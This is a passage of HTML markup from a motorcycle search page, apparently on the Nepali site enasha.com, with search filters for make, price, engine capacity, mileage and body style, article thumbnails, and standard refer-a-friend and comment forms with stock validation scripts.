                          </tr>
                        </table>
                         
                          </td>
                      <!--end-->
                    </tr>
                </table></td>
              </tr>
              <tr>
                <td align="center">                    [Prev]                                        <span style="font-family: Verdana, Arial,Helvetica, sans-serif; font-size: 16px">1</span>
                    <a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=2&chk_new_used=&mk=&release_min_year=&release_max_year=&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=&min_capacity=&color=&color_tag="> 2 </a><a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=3&chk_new_used=&mk=&release_min_year=&release_max_year=&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=&min_capacity=&color=&color_tag="> 3 </a><a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=4&chk_new_used=&mk=&release_min_year=&release_max_year=&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=&min_capacity=&color=&color_tag="> 4 </a><a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=5&chk_new_used=&mk=&release_min_year=&release_max_year=&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=&min_capacity=&color=&color_tag="> 5 </a><a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=6&chk_new_used=&mk=&release_min_year=&release_max_year=&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=&min_capacity=&color=&color_tag="> 6 </a>                    <a href="/bike_search_result.php/enashacss/enashacss/enashacss/bikes.js?page=2&chk_new_used=&mk=&release_min_year=&release_max_year=&price=&bt=&body_type=&min_mileage=&max_mileage=&mod=&min_capacity=&color=&color_tag=">[Next]</a>                                    </td>
              </tr>
            </table>
			</form>			</td>
          </tr>
         
          <tr>
            <td valign="top"><p>&nbsp;</p>              </td>
          </tr>
        
          <tr>
            <td><table width="546" border="0" cellpadding="0" cellspacing="0" class="article-list-box">
              <tr>
                <td>
                  <table width="535" border="0" align="center" cellpadding="0" cellspacing="0">
				 <!-- <form id="form2" name="form2" method="post" action="">-->
                    <tr>
                      <td height="35"><span class="article-para-title1">Bike Search <span class="photo-caption">(select the required options only)</span> </span></td>
                    </tr>
                    <tr>
                      <td><span class="photo-caption">
                      <input name="radiobutton" type="radio" class="body1" value="1" checked="checked" onClick="newused(1)"/>
                        New</span></td>
                    </tr>
                    <tr>
                      <td height="25"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td bgcolor="#CCCCCC"><img src="main/images/transdot.gif" width="3" height="1" /></td>
                        </tr>
                      </table></td>
                    </tr>
                    <tr>
					
                      <td><table width="89%" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td height="43">				  <table width="100%" cellpadding="0" cellspacing="0">
					<tr>
					  <td width="257" ><table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
						  <tr>
							<td width="17%"  class="photo-caption"><strong>Make</strong></td>
							<td width="83%"><!--<table width="100%" border="0" cellspacing="0" cellpadding="0">-->
				<form name="myform" id="myform">
				<select name="company"  class="DropDownList"    onchange="makeRequest()" >
					  <option value="" >- Any -</option>
					  					  <option value="Anna Lifan"> Anna Lifan </option>
					  					  <option value="Bajaj"> Bajaj </option>
					  					  <option value="Cosmic Yingyang"> Cosmic Yingyang </option>
					  					  <option value="Daelim"> Daelim </option>
					  					  <option value="FIR"> FIR </option>
					  					  <option value="Futong"> Futong </option>
					  					  <option value="Hartford"> Hartford </option>
					  					  <option value="Hero Honda"> Hero Honda </option>
					  					  <option value="Hima"> Hima </option>
					  					  <option value="Honda"> Honda </option>
					  					  <option value="Jialing"> Jialing </option>
					  					  <option value="Kinetic"> Kinetic </option>
					  					  <option value="Kington"> Kington </option>
					  					  <option value="Kymco"> Kymco </option>
					  					  <option value="LIFAN"> LIFAN </option>
					  					  <option value="Royal Enfield"> Royal Enfield </option>
					  					  <option value="Shineray"> Shineray </option>
					  					  <option value="Suzuki"> Suzuki </option>
					  					  <option value="TVS"> TVS </option>
					  					  <option value="Yamaha"> Yamaha </option>
					  					  <option value="Zongshen"> Zongshen </option>
					  					</select></form>
				</td>
						  </tr>
						</table>
                                      <!--End Of Model Table--></td>
                                  <td width="51"  class="photo-caption"><div align="center"><strong>Model</strong></div></td>
                                  <td width="227"><!--For Make-->
                                                                                    <div id="divMessage">
                                                  <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                                    <tr>
                                                      <td>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<form name="myform1" id="myform1">
<tr>
<td>
<select name="model" class="DropDownList" style="width: 150px"  onchange="makeRequest1()" disabled>
<option value="">- Any -</option>
</select></td>
</tr>
</form>
</table></td>
</tr>
</table>
</div>
                                    <!--End Of Make--></td>
                                </tr>
                                <tr>
                                  <td colspan="3" ><table width="100%" border="0" cellspacing="0" cellpadding="0">
                                      <tr>
                                        <td><table width="535" border="0" cellspacing="0" cellpadding="0"><form name="frm">
                                            <tr>
                                                                                            <td width="49" height="0" class="photo-caption"><div align="right"><span style="photo-caption"><strong>Price &nbsp;</strong></span></div></td>
                                              <td width="170" height="0"><select name="price" class="DropDownList" style="width: 150px" >
                                                  <option value="" selected="selected">- Any -</option>
                                                  <option value="60000 and 80000">60,000 to 80,000</option>
                                                  <option value="81000 and 100000">81,000 to 100,000</option>
                                                  <option value="101000 and 120000">101,000 to 120,000</option>
                                                  <option value="121000 and 140000">121,000 to 140,000</option>
                                                  <option value="141000 and 160000">141,000 to 160,000</option>
                                                  <option value="161000 and 180000">161,000 to 180,000</option>
                                                  <option value="181000 and 200000 ">181,000 to 200,000 </option>
                                                  <option value="201000 and 220000 ">201,000 to 220,000 </option>
                                                  <option value="221000 and 240000">221,000 to 240,000</option>
                                                  <option value="241000 and 260000">241,000 to 260,000</option>
                                                  <option value="261000 and 280000">261,000 to 280,000</option>
                                              </select></td>
                                              <td width="95" height="0"><span class="photo-caption" style="photo-caption"><strong><strong>Engine Capacity: </strong></strong></span></td>
                                              <td width="152" height="0"><span class="photo-caption">
                                                <select name="min_capacity" class="DropDownList" style="width: 150px" >
                                                  <option value="" selected="selected">- Any -</option>
                                                  <option value="0 and 100">less then 100 cc</option>
                                                  <option value="100 and 125">100 above to 125 cc</option>
                                                  <option value="125 and 150">125 above to 150 cc</option>
                                                  <option value="150 and 180">150 above to 180 cc</option>
                                                  <option value="180 and 1000">More than 180 cc</option>
                                                </select>
                                              </span></td>
                                            </tr>
                                            <tr>
                                              <td height="0" class="photo-caption">&nbsp;</td>
                                              <td height="0"  class="photo-caption">&nbsp;</td>
                                              <td height="0">&nbsp;</td>
                                              <td height="0">&nbsp;</td>
                                            </tr>
                                            <tr>
                                              <td height="0" class="photo-caption">&nbsp;</td>
                                         
										      <td height="0" class="photo-caption" ><a href="#" onClick="submission()">
											   <img src="main/images/buttn_search.jpg" width="150" height="27" border="0" /></a>
                                                    <input name="chk_val" type="hidden" value="1"/>                                                     </td>
                                              <td height="0" class="photo-caption">&nbsp;</td>
                                              <td height="0" class="photo-caption">&nbsp;</td>
                                            </tr>
                                            <tr>
                                              <td height="18" colspan="5" class="photo-caption">&nbsp;</td>
                                            </tr></form>
                                            <tr>
                                              <td height="18" colspan="5" class="photo-caption"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                                                <tr>
                                                  <td width="41%"><table width="203" cellpadding="0" cellspacing="0">
                                                    <form name="milfrm" id="milfrm">
                                                      <tr>
                                                        <td height="16" colspan="3"><strong>Mileage:</strong></td>
                                                      </tr>
                                                      <tr>
                                                        <td ><input name="bodytypecheck" type="radio" class="body1" value="1" checked="checked" onclick="checknewused_milage(1)"
/>
                                                          New
                                                          <input name="bodytypecheck" type="radio" class="body1" value="2" onclick="checknewused_milage(2)"
/>
                                                          Used
                                                          <input type="hidden" name="ctl_milage"  value="bike_search_result.php"/>
                                                        </td>
                                                      </tr>
                                                      <tr>
                                                        <td width="195" ><select name="min_mileage" class="DropDownList" 
												  style="width: 60px" >
                                                            <option value="" selected="selected">- Min -</option>
                                                                                                                        <option value="20">
                                                            20                                                            </option>
                                                                                                                        <option value="25">
                                                            25                                                            </option>
                                                                                                                        <option value="30">
                                                            30                                                            </option>
                                                                                                                        <option value="35">
                                                            35                                                            </option>
                                                                                                                        <option value="40">
                                                            40                                                            </option>
                                                                                                                        <option value="45">
                                                            45                                                            </option>
                                                                                                                        <option value="50">
                                                            50                                                            </option>
                                                                                                                        <option value="55">
                                                            55                                                            </option>
                                                                                                                        <option value="60">
                                                            60                                                            </option>
                                                                                                                        <option value="65">
                                                            65                                                            </option>
                                                                                                                        <option value="70">
                                                            70                                                            </option>
                                                                                                                      </select>
                                                            <span class="body1-small"> ~ </span>
                                                            <select name="max_mileage" class="DropDownList" style="width: 60px" >
                                                              <option value="" selected="selected">- Max -</option>
                                                                                                                            <option value="25">
                                                              25                                                              </option>
                                                                                                                            <option value="30">
                                                              30                                                              </option>
                                                                                                                            <option value="35">
                                                              35                                                              </option>
                                                                                                                            <option value="40">
                                                              40                                                              </option>
                                                                                                                            <option value="45">
                                                              45                                                              </option>
                                                                                                                            <option value="50">
                                                              50                                                              </option>
                                                                                                                            <option value="55">
                                                              55                                                              </option>
                                                                                                                            <option value="60">
                                                              60                                                              </option>
                                                                                                                            <option value="65">
                                                              65                                                              </option>
                                                                                                                            <option value="70">
                                                              70                                                              </option>
                                                                                                                            <option value="75">
                                                              75                                                              </option>
                                                                                                                          </select>
                                                            <span class="body1-small">kmpl </span></td>
                                                      </tr>
                                                      <tr>
                                                        <td colspan="3" height="55"><a href="#"  onclick="milagesubmit()"><img src="main/images/buttn_search.jpg" width="150" height="27" border="0"/></a></td>
                                                        <input type="hidden" name="mod" value="milage" />
                                                      </tr>
                                                    </form>
                                                  </table></td>
                                                  <td width="59%"><div align="center"><a href="http://www.enasha.com/bikes_compare.php"><img src="main/images/bikes/grap_bikes_comp.jpg" width="186" height="116" border="0" /></a></div></td>
                                                </tr>
                                              </table></td>
                                              </tr>
                                        </table></td>
                                      </tr>
                                  </table></td>
                                </tr>
                            </table></td>
                        </tr>
                      </table></td>
                    </tr>
                  
				  <!--</form>dd-->
				  
                  </table>
                                
                  <p>&nbsp;</p></td>
              </tr>
            </table>
            </td>
          </tr>
         <form name="bodytypefrm">  <tr>
            <td height="30"><table width="100%" border="0">
              <tr>
                <td width="38%">
				<span class="article-para-title1">Search By Body Style</span></td>
                <td width="62%">  <span class="photo-caption">
                 <input name="bodytypecheck" type="radio" class="body1" value="1" checked="checked" onClick="checknewused(1)"
/>New</span>
 <span class="photo-caption"><input name="bodytypecheck" type="radio" class="body1" value="2" onClick="checknewused(2)"
/>Used<input type="hidden" name="bttxt"  value="bike_search_result.php"/>	</span></td>
              </tr>
            </table></td>
			
          </tr>
          <tr>
            <td><table width="250" border="0" cellspacing="0" cellpadding="0">
                     
                <td width="183" ><table width="90" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="70" class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                    </tr>
                    <tr>
                      <td height="80" width="70" align="center" class="a:link">
					  <a href="#"><img src="bikedb/bodystyle_pic/bs1.gif"  border="0" onClick="checkbike('City')"/></a> </td>
                    </tr>
                    <tr>
                      <td width="70" align="center" class="a:link">
					  <a href="#" onClick="checkbike('City')">City</a></td>
                    </tr>
                  </table>
                           
                <td width="183" ><table width="90" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="70" class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                    </tr>
                    <tr>
                      <td height="80" width="70" align="center" class="a:link">
					  <a href="#"><img src="bikedb/bodystyle_pic/bs6.gif"  border="0" onClick="checkbike('Cruise')"/></a> </td>
                    </tr>
                    <tr>
                      <td width="70" align="center" class="a:link">
					  <a href="#" onClick="checkbike('Cruise')">Cruise</a></td>
                    </tr>
                  </table>
                           
                <td width="183" ><table width="90" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="70" class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                    </tr>
                    <tr>
                      <td height="80" width="70" align="center" class="a:link">
					  <a href="#"><img src="bikedb/bodystyle_pic/bs4.gif"  border="0" onClick="checkbike('Dirt / off road')"/></a> </td>
                    </tr>
                    <tr>
                      <td width="70" align="center" class="a:link">
					  <a href="#" onClick="checkbike('Dirt / off road')">Dirt / off road</a></td>
                    </tr>
                  </table>
                           
                <td width="183" ><table width="90" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="70" class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                    </tr>
                    <tr>
                      <td height="80" width="70" align="center" class="a:link">
					  <a href="#"><img src="bikedb/bodystyle_pic/bs5.gif"  border="0" onClick="checkbike('Moped')"/></a> </td>
                    </tr>
                    <tr>
                      <td width="70" align="center" class="a:link">
					  <a href="#" onClick="checkbike('Moped')">Moped</a></td>
                    </tr>
                  </table>
                           
                <td width="183" ><table width="90" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="70" class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                    </tr>
                    <tr>
                      <td height="80" width="70" align="center" class="a:link">
					  <a href="#"><img src="bikedb/bodystyle_pic/bs3.gif"  border="0" onClick="checkbike('Scooter')"/></a> </td>
                    </tr>
                    <tr>
                      <td width="70" align="center" class="a:link">
					  <a href="#" onClick="checkbike('Scooter')">Scooter</a></td>
                    </tr>
                  </table>
                           
                <td width="183" ><table width="90" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td width="70" class="car-sr-heading"><img src="main/images/transdot.gif" width="2" height="6" /></td>
                    </tr>
                    <tr>
                      <td height="80" width="70" align="center" class="a:link">
					  <a href="#"><img src="bikedb/bodystyle_pic/bs2.gif"  border="0" onClick="checkbike('Sports')"/></a> </td>
                    </tr>
                    <tr>
                      <td width="70" align="center" class="a:link">
					  <a href="#" onClick="checkbike('Sports')">Sports</a></td>
                    </tr>
                  </table>
                    </td>
              </tr>
            </table></td>
          </tr></form>
          <tr>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td> <tr><td colspan="2" >&nbsp;</td></tr>
 <tr>
<td colspan="2"><span class="article-title1">Latest Articles posted in the site</span></td>
          </tr>
		   <tr><td colspan="2" >&nbsp;&nbsp;</td></tr>
          <tr>
            <td colspan="2"><table width="546" border="0" cellspacing="0" cellpadding="0">
                <tr valign="top">
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="149" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3500"> <img src="uploaded/tn_3500.jpg" width="149" height="149" border="0"/></a>
                            </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td><span class="article-listbox-article-title"><strong><span class="article-listbox-section-title"><a href="article.php?id=3500">Sonitpur Saanjh 2068</a></span></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                  <td width="5">&nbsp;</td>
                  <td width="177"><table width="179" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="149" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3499"> <img src="uploaded/tn_3499.jpg" width="149" height="149" border="0"/></a>
                              </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3499">Style Check Dashain Fashion 2011</a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                  <td width="5">&nbsp;</td>
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="149" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3498"> <img src="uploaded/tn_3498.jpg" width="149" height="149" border="0"/></a>
                                </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3498">Style Check Dashain Fashion 2011</a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                </tr>
            </table></td>
          </tr>
          <tr>
            <td colspan="2">&nbsp;</td>
          </tr>
          <tr>
            <td colspan="2"><table width="546" border="0" cellspacing="0" cellpadding="0">
                <tr valign="top">
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="155" height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3497"> <img src="uploaded/tn_3497.jpg" width="149" height="149" border="0"/></a>
                                  </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3497">Style Check Dashain Fashion 2011</a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                  <td width="5">&nbsp;</td>
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="155" height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3496"> <img src="uploaded/tn_3496.jpg" width="149" height="149" border="0"/></a>
                               </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3496"><b>Style Check Dashain Fashion 2011</b></a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                  <td width="5">&nbsp;</td>
                  <td width="177"><table width="178" border="0" cellpadding="0" cellspacing="1" class="article-list-box">
                      <tr>
                        <td bgcolor="#FFFFFF"><table width="155" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="155" height="25" class="article-listbox-section-title"></td>
                            </tr>
                            <tr>
                              <td>                                   <a href="article.php?id=3495"> <img src="uploaded/tn_3495.jpg" width="149" height="149" border="0"/></a>
                                </td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                            <tr>
                              <td class="body1"><span class="article-listbox-article-title"><strong><a href="article.php?id=3495"><b>Style Check Dashain Fashion 2011</b></a></strong></span></td>
                            </tr>
                            <tr>
                              <td><img src="/images/transdot.gif" width="3" height="6" /></td>
                            </tr>
                        </table></td>
                      </tr>
                  </table></td>
                </tr>
            </table></td>
          </tr>
          <tr>
            <td colspan="2">&nbsp;</td> </tr></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td height="210" valign="top" background="main/images/bg_refer_page.jpg"><script type="text/JavaScript">
<!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
  } if (errors) alert('The following error(s) occurred:\n'+errors);
  document.MM_returnValue = (errors == '');
}
//-->
</script>

<table width="546" border="0" cellpadding="0" cellspacing="0" background="http://www.enasha.com/main/images/bg_refer_page.jpg">
  <tr>
    <td>
      <table width="500" border="0" align="center" cellpadding="1" cellspacing="0"><form action="" method="post" name="form1" id="form1">
        <tr>
          <td height="50" class="photo-caption">&nbsp;</td>
          <td class="photo-caption"></td>
          <td class="photo-caption">&nbsp;</td>
          <td class="photo-caption">&nbsp;</td>
          <td class="photo-caption">&nbsp;</td>
        </tr>
        <tr>
          <td class="photo-caption"><div align="center">YOURS</div></td>
          <td class="photo-caption">Name</td>
          <td class="photo-caption"><input name="yourname" type="text" class="photo-caption" id="yourname" size="20" /></td>
          <td class="photo-caption"><div align="center">Email</div></td>
          <td class="photo-caption"><input name="email1" type="text" class="photo-caption" id="email1" size="35" /></td>
        </tr>
        <tr>
          <td colspan="5" class="photo-caption"><img src="../../main/images/transdot.gif" width="2" height="7" /></td>
        </tr>
        <tr>
          <td width="82" class="photo-caption"><div align="center">Friend 1 </div></td>
          <td width="32" class="photo-caption"><div align="left">Name</div></td>
          <td width="140" class="photo-caption"><input name="friend1" type="text" class="photo-caption" id="friend1" size="20" /></td>
          <td width="33" class="photo-caption"><div align="center">Email</div></td>
          <td width="203" class="photo-caption"><input name="email2" type="text" class="photo-caption" id="email2" size="35" /></td>
        </tr>
        <tr>
          <td class="photo-caption"><div align="center">Friend 2 </div></td>
          <td class="photo-caption">Name</td>
          <td class="photo-caption"><input name="friend2" type="text" class="photo-caption" id="friend2" size="20" /></td>
          <td class="photo-caption"><div align="center">Email</div></td>
          <td class="photo-caption"><input name="email3" type="text" class="photo-caption" id="email3" size="35" /></td>
        </tr>
        <tr>
          <td class="photo-caption"><div align="center">Friend 3 </div></td>
          <td class="photo-caption">Name</td>
          <td class="photo-caption"><input name="friend3" type="text" class="photo-caption" id="friend3" size="20" /></td>
          <td class="photo-caption"><div align="center">Email</div></td>
          <td class="photo-caption"><input name="email4" type="text" class="photo-caption" id="email4" size="35" /></td>
        </tr>
        <tr>
          <td class="photo-caption">&nbsp;</td>
          <td class="photo-caption">&nbsp;</td>
          <td height="45" class="photo-caption"><input name="image" type="image" onclick="MM_validateForm('yourname','','R','email1','','RisEmail','friend1','','R','email2','','RisEmail');return document.MM_returnValue" src="main/images/buttn_pt_send.jpg" width="86" height="30" /></td>
          <td class="photo-caption"><div align="center"></div></td>
          <td class="photo-caption">&nbsp;</td>
        </tr></form>
      </table>
    </td>
  </tr>
</table>
</td>
          </tr>
          <tr>
            <td><img src="main/images/transdot.gif" width="3" height="5" /></td>
          </tr>
          <tr>
            <td><table width="546" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td height="210" valign="top" background="main/images/bg_post_comment.jpg"><script type="text/JavaScript">
<!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
  } if (errors) alert('The following error(s) occurred:\n'+errors);
  document.MM_returnValue = (errors == '');
}
//-->
</script>



  <table width="546" border="0" cellpadding="6" cellspacing="0" background="http://www.enasha.com/main/images/bg_post_comment.jpg">
    <tr>
      <td><table width="100%" border="0" align="center" cellpadding="2" cellspacing="0">
        <form id="comments" name="comments" method="post" action="">
          <tr>
            <td height="40" class="photo-caption">&nbsp;</td>
            <td colspan="3"><span class="bodyarticle"> </span></td>
          </tr>
          <tr>
            <td width="105" class="photo-caption">Your Name: </td>
            <td colspan="3"><span class="photo-caption">
              <input name="name" type="text" class="photo-caption" id="name" size="20" />
              City
              <input name="city" type="text" class="photo-caption" id="city" size="15" />
              Country
              <input name="country" type="text" class="photo-caption" id="country" size="15"/>
            </span></td>
          </tr>
          <tr>
            <td class="photo-caption">Your Email: </td>
            <td width="152"><span class="photo-caption">
              <input name="mail" type="text" class="photo-caption" id="mail" size="25" />
            </span></td>
            <td width="123"><div align="right"><span class="photo-caption">Rate this Article:&nbsp; </span></div></td>
            <td width="104"><div align="left">
                <select name="rate" class="photo-caption" id="rate">
                  <option selected="selected">RATE HERE</option>
                  <option>Excellent</option>
                  <option>Very Good</option>
                  <option>Good</option>
                  <option>Average</option>
                  <option>Poor</option>
                </select>
            </div></td>
          </tr>
          <tr>
            <td valign="top" class="photo-caption">Comments: </td>
            <td colspan="3"><textarea name="comments" cols="50" rows="3" id="comments"></textarea></td>
          </tr>
          <tr>
            <td valign="top" class="photo-caption">&nbsp;</td>
            <td height="35" colspan="3" valign="middle"><label>
              <input name="submit" type="image" id="submit" onclick="MM_validateForm('name','','R','country','','R','mail','','R');return document.MM_returnValue" src="main/images/buttn_post.jpg" />
            </label></td>
          </tr>
        </form>
      </table></td>
    </tr>
  </table>
  </td>
              </tr>
            </table></td>
          </tr>
        </table></td>
        <td width="172" valign="top"><table width="172" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td><table width="172"  border="0" align="left" cellpadding="0" cellspacing="0">
              <tr>
                <td valign="top"><img src="images/channel-head.jpg" width="172" height="37" /></td>
              </tr>
              <tr>
                <td  width="172" height="27" valign="top" class="channel-table-Bg">
				
				
				<table width="172"  border="0" cellpadding="0" cellspacing="0">
                  <tr valign="top">
                    <td width="172" height="27"><table width="172"  border="0" cellspacing="0" cellpadding="0">
                      <tr>
					                          <td height="333.6" valign="top">
                        <script type='text/javascript' src='menu_com.js'></script> <script type='text/javascript'>
function Go(){return}
                        </script>
                          <script language="javascript">
/***********************************************************************************
*	(c) Ger Versluis 2000 version 5.411 24 December 2001 (updated Jan 31st, 2003 by Dynamic Drive for Opera7)
*	For info write to menus@burmees.nl		          *
*	You may remove all comments for faster loading	          *		
***********************************************************************************/
	var NoOffFirstLineMenus=5;			// Number of first level items
	var LowBgColor='#668ecc';			// Background color when mouse is not over
	var LowSubBgColor='#719ee2';			// Background color when mouse is not over on subs
	var HighBgColor='#2a4b8e';			// Background color when mouse is over
	var HighSubBgColor='#2a4b8e';			// Background color when mouse is over on subs
	var FontLowColor='white';			// Font color when mouse is not over
	var FontSubLowColor='white';			// Font color subs when mouse is not over
	var FontHighColor='white';			// Font color when mouse is over
	var FontSubHighColor='white';			// Font color subs when mouse is over
	var BorderColor='white';			// Border color
	var BorderSubColor='white';			// Border color for subs
	var BorderWidth=1;				// Border width
	var BorderBtwnElmnts=1;			// Border between elements 1 or 0
	var FontFamily="arial,comic sans ms,technical"	// Font family menu items
	var FontSize=9;				// Font size menu items
	var FontBold=1;				// Bold menu items 1 or 0
	var FontItalic=0;				// Italic menu items 1 or 0
	var MenuTextCentered='left';			// Item text position 'left', 'center' or 'right'
	var MenuCentered='left';			// Menu horizontal position 'left', 'center' or 'right'
	var MenuVerticalCentered='top';		// Menu vertical position 'top', 'middle','bottom' or static
	var ChildOverlap=-.0001;				// horizontal overlap child/ parent
	var ChildVerticalOverlap=0;			// vertical overlap child/ parent
	var StartTop=178;				// Menu offset x coordinate
	var StartLeft=565;				// Menu offset y coordinate
	var VerCorrect=0;				// Multiple frames y correction
	var HorCorrect=0;				// Multiple frames x correction
	var LeftPaddng=16;				// Left padding
	var TopPaddng=6;				// Top padding
	var FirstLineHorizontal=0;			// SET TO 1 FOR HORIZONTAL MENU, 0 FOR VERTICAL
	var MenuFramesVertical=1;			// Frames in cols or rows 1 or 0
	var DissapearDelay=1000;			// delay before menu folds in
